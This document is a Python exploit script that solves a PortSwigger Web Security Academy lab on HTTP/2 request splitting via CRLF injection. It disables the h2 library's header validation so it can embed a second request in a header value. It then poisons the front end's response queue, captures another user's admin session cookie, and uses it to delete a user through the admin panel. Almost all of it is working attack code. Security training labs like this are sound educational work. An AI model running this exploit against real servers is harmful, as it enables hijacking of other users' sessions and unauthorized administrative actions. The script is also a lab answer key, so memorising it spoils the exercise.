#!/usr/bin/env python3
"""
HTTP/2 request splitting via CRLF injection
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 11-h2-request-splitting-crlf-injection.md

What this does:
    Injects a complete second HTTP request directly into an HTTP/2 header
    value: "foo: bar\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: TARGET". When the
    front-end downgrades this to HTTP/1.1 text, it appends its own
    \\r\\n\\r\\n to terminate the header block -- which just closes out our
    (empty) trailing header, leaving the complete request we embedded
    earlier standing as a fully independent HTTP/1.1 request. No secondary
    TE.CL-style desync is needed; the CRLF sequence directly splits the
    request stream. Both halves target the nonexistent path /x, so every
    normal response is a clean 404 and each send is dual-purpose: it
    re-poisons the response queue AND acts as a capture probe, since
    whatever comes back is either our own 404 or -- once the queue is
    poisoned -- someone else's response shifted into our slot.

    Requires validate_outbound_headers=False and
    normalize_outbound_headers=False on the h2 library, same as every other
    HTTP/2 payload in this series -- its defaults strip literal \\r\\n
    sequences from header values before they reach the wire.

Usage:
    python 11-h2-request-splitting-crlf-injection.py <lab-url>
    e.g. python 11-h2-request-splitting-crlf-injection.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install h2 httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 10.0):
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass

    return ssl_sock, conn


def send_split_probe(host: str, port: int = 443, timeout: float = 5.0) -> dict:
    """Send one CRLF-split dual-purpose probe against /x."""
    import h2.events as h2e

    ssl_sock, conn = create_h2_connection(host, port)

    crlf_value = f"bar\r\n\r\nGET /x HTTP/1.1\r\nHost: {host}"
    headers = [
        (":method", "GET"),
        (":path", "/x"),
        (":authority", host),
        (":scheme", "https"),
        ("foo", crlf_value),
    ]

    conn.send_headers(1, headers, end_stream=True)
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(timeout)
    result = {"status": None, "headers": {}, "data": b""}
    try:
        while True:
            chunk = ssl_sock.recv(4096)
            if not chunk:
                break
            events = conn.receive_data(chunk)
            for event in events:
                if isinstance(event, h2e.ResponseReceived):
                    hdrs = dict(event.headers)
                    result["headers"] = hdrs
                    status = hdrs.get(b":status", hdrs.get(":status", b""))
                    result["status"] = status.decode() if isinstance(status, bytes) else status
                elif isinstance(event, h2e.DataReceived):
                    result["data"] += event.data
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
                elif isinstance(event, h2e.StreamEnded):
                    ssl_sock.sendall(conn.data_to_send())
                    break
            if result["status"]:
                break
            ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass
    ssl_sock.close()
    return result


def solve(lab_url: str, max_attempts: int = 60, interval: float = 5.0) -> None:
    host = urlparse(lab_url).hostname

    print(f"[*] Sending dual-purpose CRLF-split probes against /x every {interval:.0f}s "
          f"(up to {max_attempts} attempts) -- each poisons the response queue and "
          f"checks whether it's already poisoned.")

    session = None
    for attempt in range(1, max_attempts + 1):
        try:
            result = send_split_probe(host)
        except Exception as e:
            print(f"  [{attempt}] error: {e}")
            time.sleep(interval)
            continue

        status = result["status"]
        print(f"  [{attempt}/{max_attempts}] status={status}")

        if status and status != "404":
            all_text = str(result["headers"]) + result["data"].decode(errors="replace")
            cookie_match = re.search(r"session=([a-zA-Z0-9]+)", all_text)
            if cookie_match:
                session = cookie_match.group(1)
                print(f"[+] Captured a non-404 response at attempt {attempt} carrying "
                      f"the admin's session cookie: {session}")
                break

        time.sleep(interval)

    if not session:
        print(f"[-] No admin session captured after {max_attempts} attempts. "
              f"PortSwigger's own solution notes the same fallback for a stalled "
              f"attack: send 10 ordinary requests to reset the connection, then "
              f"rerun this script.")
        return

    for attempt in range(1, 6):
        r = httpx.get(f"{lab_url}/admin", cookies={"session": session}, verify=False)
        print(f"[*] GET /admin with captured session -- status {r.status_code}")
        if r.status_code == 200:
            m = re.search(r'(/admin/delete\?username=carlos)', r.text)
            if m:
                delete_link = m.group(1)
                httpx.get(f"{lab_url}{delete_link}", cookies={"session": session}, verify=False)
                print(f"[+] Deleted carlos via {delete_link}.")
            break
        time.sleep(2)

    check = httpx.get(lab_url + "/", verify=False)
    if "is-solved" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- rerun; response queue poisoning is probabilistic.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
